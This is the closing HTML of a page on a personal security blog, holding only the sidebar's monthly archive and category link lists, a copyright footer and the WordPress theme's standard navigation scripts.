	<li><a href='https://maxkersten.nl/2024/04/'>April 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/03/'>March 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/02/'>February 2024</a></li>
	<li><a href='https://maxkersten.nl/2023/08/'>August 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/05/'>May 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/04/'>April 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/03/'>March 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/02/'>February 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/01/'>January 2023</a></li>
	<li><a href='https://maxkersten.nl/2022/12/'>December 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/11/'>November 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/10/'>October 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/09/'>September 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/08/'>August 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/07/'>July 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/06/'>June 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/05/'>May 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/04/'>April 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/03/'>March 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/02/'>February 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/01/'>January 2022</a></li>
	<li><a href='https://maxkersten.nl/2021/12/'>December 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/11/'>November 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/10/'>October 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/09/'>September 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/08/'>August 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/07/'>July 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/06/'>June 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/05/'>May 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/04/'>April 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/03/'>March 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/02/'>February 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/01/'>January 2021</a></li>
	<li><a href='https://maxkersten.nl/2020/12/'>December 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/11/'>November 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/10/'>October 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/09/'>September 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/08/'>August 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/07/'>July 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/06/'>June 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/05/'>May 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/04/'>April 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/03/'>March 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/02/'>February 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/01/'>January 2020</a></li>
	<li><a href='https://maxkersten.nl/2019/12/'>December 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/11/'>November 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/10/'>October 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/09/'>September 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/08/'>August 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/07/'>July 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/06/'>June 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/05/'>May 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/04/'>April 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/03/'>March 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/02/'>February 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/01/'>January 2019</a></li>
	<li><a href='https://maxkersten.nl/2018/12/'>December 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/11/'>November 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/10/'>October 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/09/'>September 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/08/'>August 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/07/'>July 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/06/'>June 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/01/'>January 2018</a></li>
	<li><a href='https://maxkersten.nl/2017/10/'>October 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/07/'>July 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/06/'>June 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/05/'>May 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/04/'>April 2017</a></li>
			</ul>

			</aside><aside id="categories-2" class="widget inner-padding widget_categories"><h4 class="widget-title">Categories</h4>
			<ul>
					<li class="cat-item cat-item-10"><a href="https://maxkersten.nl/category/androidprojectcreator/">AndroidProjectCreator</a>
</li>
	<li class="cat-item cat-item-16"><a href="https://maxkersten.nl/category/api-clients/">API Clients</a>
</li>
	<li class="cat-item cat-item-9"><a href="https://maxkersten.nl/category/binary-analysis-course/">Binary Analysis Course</a>
</li>
	<li class="cat-item cat-item-4"><a href="https://maxkersten.nl/category/capricorn/">Capricorn</a>
</li>
	<li class="cat-item cat-item-18"><a href="https://maxkersten.nl/category/conferences/">Conferences</a>
</li>
	<li class="cat-item cat-item-3"><a href="https://maxkersten.nl/category/ethics/">Ethics</a>
</li>
	<li class="cat-item cat-item-2"><a href="https://maxkersten.nl/category/gemini/">Gemini</a>
</li>
	<li class="cat-item cat-item-6"><a href="https://maxkersten.nl/category/lectures/">Lectures</a>
</li>
	<li class="cat-item cat-item-19"><a href="https://maxkersten.nl/category/libras-ghidra-library/">Libra&#039;s Ghidra Library</a>
</li>
	<li class="cat-item cat-item-17"><a href="https://maxkersten.nl/category/m3/">m3</a>
</li>
	<li class="cat-item cat-item-15"><a href="https://maxkersten.nl/category/magecart/">MageCart</a>
</li>
	<li class="cat-item cat-item-13"><a href="https://maxkersten.nl/category/malpull/">MalPull</a>
</li>
	<li class="cat-item cat-item-8"><a href="https://maxkersten.nl/category/malware-analysis/">Malware Analysis</a>
</li>
	<li class="cat-item cat-item-14"><a href="https://maxkersten.nl/category/malwaretheflag/">MalwareTheFlag</a>
</li>
	<li class="cat-item cat-item-11"><a href="https://maxkersten.nl/category/responsible-disclosure/">Responsible Disclosure</a>
</li>
	<li class="cat-item cat-item-12"><a href="https://maxkersten.nl/category/reviews/">Reviews</a>
</li>
	<li class="cat-item cat-item-1"><a href="https://maxkersten.nl/category/uncategorized/">Uncategorized</a>
</li>
	<li class="cat-item cat-item-5"><a href="https://maxkersten.nl/category/web-hacking/">Web hacking</a>
</li>
	<li class="cat-item cat-item-7"><a href="https://maxkersten.nl/category/whitepapers/">Whitepapers</a>
</li>
			</ul>

			</aside>			</div><!-- .inside-right-sidebar -->
</div><!-- #secondary -->
	</div><!-- #content -->
</div><!-- #page -->
<div class="site-footer  ">
		<footer class="site-info" itemtype="http://schema.org/WPFooter" itemscope="itemscope">
		<div class="inside-site-info grid-container grid-parent">
						<div class="copyright-bar">
				<span class="copyright">&copy; 2024</span> &bull; <a href="https://generatepress.com" target="_blank" itemprop="url">GeneratePress</a>			</div>
		</div>
	</footer><!-- .site-info -->
	</div><!-- .site-footer -->

<a title="Scroll back to top" rel="nofollow" href="#" class="generate-back-to-top" style="opacity:0;visibility:hidden;" data-scroll-speed="400" data-start-scroll="300">
			<i class="fa fa-angle-up" aria-hidden="true"></i>
			<span class="screen-reader-text">Scroll back to top</span>
		</a><script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/navigation.min.js?ver=1.3.46" id="generate-navigation-js"></script>
<script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/dropdown.min.js?ver=1.3.46" id="generate-dropdown-js"></script>
<script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/back-to-top.min.js?ver=1.3.46" id="generate-back-to-top-js"></script>
<!--[if lt IE 9]>
<script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/html5shiv.min.js?ver=1.3.46" id="generate-html5-js"></script>
<![endif]-->

</body>
</html>